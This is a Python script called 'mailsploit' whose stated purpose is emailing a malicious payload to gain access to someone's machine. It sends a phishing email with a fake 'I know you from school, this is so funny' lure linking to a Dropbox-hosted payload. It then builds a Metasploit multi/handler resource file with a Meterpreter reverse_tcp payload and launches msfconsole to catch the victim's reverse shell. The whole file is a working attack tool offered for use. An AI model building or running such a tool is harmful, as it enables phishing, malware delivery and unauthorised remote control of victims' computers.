#############################################################
#
# Title: mailsploit
# Author: Th3J0k3r
#
# Purpose: to be able to send a malicious payload via email
# to gain access to somones machine.
#
############################################################
import socket
import smtplib
import ConfigParser
import mimetypes
import email
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.utils import COMMASPACE,formatdate
import time
import os
from lazyme.string import color_print


def banner ():

	os.system("clear")
	color_print(
"""


'||\   /||`              '||`    .|'''|          '||`               ||   
 ||\\.//||           ''   ||     ||               ||          ''    ||   
 ||     ||   '''|.   ||   ||     `|'''|, '||''|,  ||  .|''|,  ||  ''||'' 
 ||     ||  .|''||   ||   ||      .   ||  ||  ||  ||  ||  ||  ||    ||   
.||     ||. `|..||. .||. .||.     |...|'  ||..|' .||. `|..|' .||.   `|..'
                                          ||                             
                                         .||                             
                                                                                                                       
""", color='red')


def exploit ():

	# Setup the config file
	global targetName
	global email
	global password
	global target
	global subject
	global payload
	global debuglevel

	configParser = ConfigParser.RawConfigParser()	
	configParser.read('config')
	targetName = configParser.get('Config', 'targetName')
	email = configParser.get('Config', 'email')
	password = configParser.get('Config', 'password')
	target = configParser.get('Config', 'target')
	subject = configParser.get('Config', 'subject')
	payload = configParser.get('Config', 'payload')
	debuglevel = configParser.get('Config', 'debuglevel')

	# Validate the input.
	if email == 'None' or password == 'None' or target == 'None' or targetName == 'None':
		color_print('[!] Please setup your config file.', color='red')	
		return

	# get the smtp server via user input.
	color_print("[ Press enter twice to send via gmail ]", color='blue')
	server = raw_input('What is the smtp server you want to connect to ex(smtp.gmail.com): ')
	if server == '':
		server = 'smtp.gmail.com'
	try:
	
		port   = int(raw_input('What is the port number: '))
	except ValueError:
		port = 25

	color_print(server, color='yellow')
	color_print(str(port), color='yellow')
		
	# attempt to connect to the stmp server.
	try:
		# Connected to server.
		color_print("\n[+] Connecting to smtp server..", color='blue')

		smtp = smtplib.SMTP()
		smtp.connect(host=server, port=port)
		smtp.ehlo()
		smtp.starttls()
		smtp.ehlo()
		color_print("[+] Connected.", color='green')

	except socket.gaierror:
		# Failed to connect!!.
		color_print("\n[!] Could not connect to the server.", color='red')
		return

	try:
		# login and send the payload.
		smtp.debuglevel = debuglevel
		smtp.login(email, password)
		color_print("\n Logged in.", color='green')
		sendpayload(smtp)
	except smtplib.SMTPAuthenticationError:
		color_print("\nFaild to login try turning on lesssecureapps from 'https://myaccount.google.com/lesssecureapps'")
		return



def sendpayload (server):


	# Encrypt the payload
	raw_input("[ Upload it to drop box and press enter ]")
	link = raw_input("Paste the link to your file: ")		


	msg = MIMEMultipart('alternative')	
	msg['From'] = email
	msg['To'] = target
	msg['Date'] = formatdate(localtime = True)
	msg['Subject'] = subject

	text = """
<html>
<title>
Very funny
</title>
<p>
Hi """ + targetName + """,
<br></br>
I think I know you from school, This is so funny check this out, you will laugh so hard.
</p>
<a href=""" + link +""">""" + link + """</a>
<br>
</br>
</html>
"""
	html = MIMEText(text, 'html')
	msg.attach(html)
	
	if os.path.isfile(payload):

		# Attach the file.
		#fileMsg = MIMEBase('application','octet-stream')
	 	#fileMsg.set_payload(file(payload_new).read())
		#encoders.encode_base64(fileMsg)
	 	#fileMsg.add_header('Content-Disposition','attachment;filename= %s' % filename)
	  	#msg.attach(fileMsg)

		# Send the payload
		#color_print("[*] Sending malicious payload..", color='yellow')
		server.sendmail(email, target, msg.as_string())
		color_print("[*] Sent.", color='green')
		server.quit()
		color_print("\n[*] Email sent", color='green')

		# Do you want to listen for any connections.
		listen = raw_input('Do you want to start up a listener: [Y/N]')
		if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
			color_print("[+] Starting a listener", color='blue')
			listenForConnections()
		else:
			color_print("Thanks, Happy hacking", color='blue')
			return	
	else:
		color_print("[!] Please put your payload in " + payload + " For it to work!!", color='red')	
			
def listenForConnections ():
	lhost = raw_input('What is your LHOST (local ip address): ')
	lport = raw_input('What is your LPORT (port): ')
	payload = raw_input('What is your payload: (ex windows/meterpreter/reverse_tcp): ')
	if payload == '':
		payload = 'windows/meterpreter/reverse_tcp'

	if os.path.isfile('resource.rc'):
		os.system('rm resource.rc')
	os.system('touch resource.rc')
	os.system('echo use exploit/multi/handler >> resource.rc')
	os.system('echo set PAYLOAD ' + payload + ' >> resource.rc')
	os.system('echo set LHOST ' + lhost + ' >> resource.rc') 
	os.system('echo set LPORT ' + lport + ' >> resource.rc')
	os.system('echo set ExitOnSession false >> resource.rc')
	os.system('echo exploit -j -z >> resource.rc')
	os.system('cat resource.rc')
	os.system('msfconsole -r resource.rc')
	

#### Call the methods ####
banner()
exploit()		
